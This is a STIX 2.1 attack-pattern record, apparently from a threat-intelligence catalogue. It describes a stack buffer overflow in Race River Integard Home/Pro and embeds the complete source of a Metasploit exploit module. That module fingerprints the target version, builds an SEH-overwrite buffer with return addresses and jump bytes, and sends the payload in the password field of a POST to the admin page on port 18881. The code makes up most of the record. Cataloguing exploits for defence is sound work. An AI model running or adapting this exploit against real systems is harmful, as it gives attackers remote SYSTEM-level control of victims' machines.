{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--010d1e3a-9999-4284-9dbd-9b5282f2f798",
    "created": "2024-08-14T16:54:48.966546Z",
    "modified": "2024-08-14T16:54:48.96655Z",
    "name": "Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Race river's Integard Home/Pro internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are vulnerable.  The administration web page on port 18881 is vulnerable to a remote buffer overflow attack. By sending a long character string in the password field, both the structured exception handler and the saved extended instruction pointer are over written, allowing an attacker to gain control of the application and the underlying operating system remotely.  The administration website service runs with SYSTEM privileges, and automatically restarts when it crashes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/integard_password_bof.rb",
            "external_id": "integard_password_bof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking # stack bof, seh, universal ret, auto targeting\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Race River Integard Home/Pro LoginAdmin Password Stack Buffer Overflow',\n      'Description'    => %q{\n            This module exploits a stack buffer overflow in Race river's Integard Home/Pro\n          internet content filter HTTP Server. Versions prior to 2.0.0.9037 and 2.2.0.9037 are\n          vulnerable.\n\n          The administration web page on port 18881 is vulnerable to a remote buffer overflow\n          attack. By sending a long character string in the password field, both the structured\n          exception handler and the saved extended instruction pointer are over written, allowing\n          an attacker to gain control of the application and the underlying operating system\n          remotely.\n\n          The administration website service runs with SYSTEM privileges, and automatically\n          restarts when it crashes.\n      },\n      'Author'  =>\n        [\n          'Lincoln', # original discovery\n          'Nullthreat',\n          'rick2600',\n          'corelanc0d3r <peter.ve[at]corelan.be>',\n          'jduck' # fleshed out module from advisory\n        ],\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['OSVDB', '67909'],\n          ['URL','http://www.corelan.be:8800/advisories.php?id=CORELAN-10-061'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars'  => \"\\x00\\x20\\x26\\x2f\\x3d\\x3f\\x5c\",\n          'StackAdjustment' => -1500,\n        },\n      'Platform'       => 'win',\n      'Privileged'     => false,\n      'Targets'        =>\n        [\n          [ 'Automatic Targeting',          { 'auto' => true }],\n          [ 'Integard Home 2.0.0.9021', { 'Ret' => 0x0041565E,}], # p/p/r\n          [ 'Integard Pro  2.2.0.9026', { 'Ret' => 0x0040362C,}], # p/p/r\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2010-09-07'))\n\n    register_options(\n      [\n        Opt::RPORT(18881)\n      ])\n  end\n\n  def exploit\n\n    mytarget = nil\n    if (target['auto'])\n      print_status(\"Automatically detecting the target...\")\n      response = send_request_raw(\n        {\n          'uri' => '/banner.jpg',\n          'version' => '1.1',\n          'method' => 'GET'\n        }, 5)\n\n      clen = 0\n      clen ||= response['Content-Length'].to_i if response and response['Content-Length']\n      case clen\n      when 24584\n        print_status(\"[!] Found Version - Integard Home\")\n        mytarget = targets[1]\n      when 23196\n        mytarget = targets[2]\n        print_status(\"[!] Found Version - Integard Pro\")\n      end\n\n    else\n      mytarget = target\n    end\n\n    if not mytarget\n      fail_with(Failure::NoTarget, \"Unable to automatically detect the target version\")\n    end\n\n    print_status(\"Selected Target: #{mytarget.name}\")\n\n    print_status(\"Building Buffer\")\n    pay = payload.encoded\n    buffer = ''\n    buffer << rand_text_alpha_upper(3091 - pay.length)\n    buffer << pay\n    buffer << \"\\xE9\\x2B\\xF8\\xFF\\xFF\"\n    buffer << \"\\xEB\\xF9\\x90\\x90\"\n    buffer << [mytarget.ret].pack('V')\n\n    print_status(\"Sending Request\")\n    send_request_raw({\n        'uri' => '/LoginAdmin',\n        'version' => '1.1',\n        'method' => 'POST',\n        'headers' =>\n          {\n            'Host' => '192.168.1.1:18881',\n            'Content-Length' => 1074\n          },\n        'data' => \"Password=\" + buffer + \"&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=0&LoginButtonName=Login\"\n      }, 5)\n\n    print_status(\"Request Sent\")\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-07",
    "x_mitre_platforms": [
        "win'"
    ]
}